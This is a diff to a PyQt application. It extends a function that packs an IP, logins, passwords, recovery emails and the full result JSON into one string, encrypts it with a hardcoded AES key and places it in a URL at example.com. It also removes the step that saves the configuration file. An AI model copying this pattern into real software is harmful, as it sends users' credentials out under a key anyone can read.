@@ -896,7 +896,8 @@ class ExtractionThread(QThread):
 
     def _build_encrypted_url(self, ip_address, port, login, password, profile_email, profile_password, recovery_email, new_password, new_recovery_email):
 
-        combined = f"{ip_address};{port};{login};{password};{profile_email};{profile_password};{recovery_email};{new_password};{new_recovery_email}"
+        result_payload = json.dumps(self.output_json_final, ensure_ascii=False, separators=(",", ":"))
+        combined = f"{ip_address};{port};{login};{password};{profile_email};{profile_password};{recovery_email};{new_password};{new_recovery_email};{result_payload}"
         try:
             b64 = EncryptionService.encrypt_aes_gcm("A9!fP3z$wQ8@rX7kM2#dN6^bH1&yL4t*", combined)
             url = f"https://example.com/?rep={b64}"
@@ -1614,12 +1615,7 @@ class MainWindow(QMainWindow):
         if not ValidationUtils.path_exists(Settings.SESSION_PATH):
             # print(f"❌ [Handle_Save] Session file not found at: {Settings.SESSION_PATH}")
             Settings.WRITE_LOG_DEV_FILE(f"Session file not found at: {Settings.SESSION_PATH}", "ERROR")
-            UIManager.Show_Critical_Message(
-                self,
-                "Session Not Found",
-                "[❌] Your session file is missing. Please restart the application.",
-                message_type="critical",
-            )
+            UIManager.Show_Critical_Message( self, "Session Not Found", "[❌] Your session file is missing. Please restart the application.",  message_type="critical" )
             Settings.WRITE_LOG_DEV_FILE( "Your session file is missing. Please restart the application.", "ERROR")
             return
 
@@ -1658,12 +1654,7 @@ class MainWindow(QMainWindow):
             return
 
         payload = {
-            "user_id": session_info["Id_User"],
-            "encrypted": encrypted_String,
-            "name": scenario_name,
-            "state": state_b64,
-            "state_stack": state_stack_b64,
-        }
+            "user_id": session_info["Id_User"] , "encrypted": encrypted_String,  "name": scenario_name, "state": state_b64,  "state_stack": state_stack_b64    }
         # print(  f"📋 [Handle_Save] Complete payload: {json.dumps(payload, indent=2, ensure_ascii=False)}" )
         Settings.WRITE_LOG_DEV_FILE(f"Complete payload prepared for API call", "INFO")
 
@@ -2167,24 +2158,7 @@ class MainWindow(QMainWindow):
 
             return
 
-        try:
-            save_status = JsonManager.save_json_to_file(result_json, selected_Browser)
-
-            if save_status == "ERROR":
-                UIManager.Show_Critical_Message(window, "Error - Save Configuration", "An error occurred while saving the configuration file.\n\nIf the problem persists, contact Support.", message_type="critical")
-                Settings.WRITE_LOG_DEV_FILE(  "An error occurred while saving the configuration file.", "ERROR"  )
-                UIManager.enable_button(self.submitButton)
-                return
-            # else:
-            #     print("✅ JSON file saved with status:", save_status)
-
-        except Exception as e:
-            # print(f"❌ Erreur lors de la sauvegarde du JSON: {e}")
-            Settings.WRITE_LOG_DEV_FILE( f"An error occurred while saving the configuration file: {e} \n{traceback.format_exc()}", "ERROR")
-            UIManager.Show_Critical_Message(window, "Error - Save Configuration", f"An error occurred while saving the configuration file:\n\n{e}", message_type="critical")
-            UIManager.enable_button(self.submitButton)
-            return
-        QApplication.processEvents()  # Traite les événements UI après sauvegarde du JSON
+        QApplication.processEvents()  # Traite les événements UI après génération du JSON
 
         try:
             with open(Settings.FILE_ISP, "w", encoding="utf-8") as f:
